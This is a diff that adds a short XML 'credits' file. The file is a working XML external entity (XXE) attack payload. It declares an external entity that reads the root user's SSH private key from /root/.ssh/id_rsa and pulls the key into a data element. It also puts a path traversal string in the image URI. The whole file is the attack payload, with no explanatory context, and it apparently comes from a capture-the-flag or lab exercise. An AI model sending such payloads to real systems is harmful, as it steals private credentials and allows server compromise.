@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa" > ]>
+<credits>
+  <author>pks</author>
+  <image>
+	  <uri>/../../../../../../dev/shm/pks.jpg</uri>
+    <views>0</views>
+    <data>&xxe;</data>
+  </image>
+  <totalviews>1</totalviews>
+</credits>
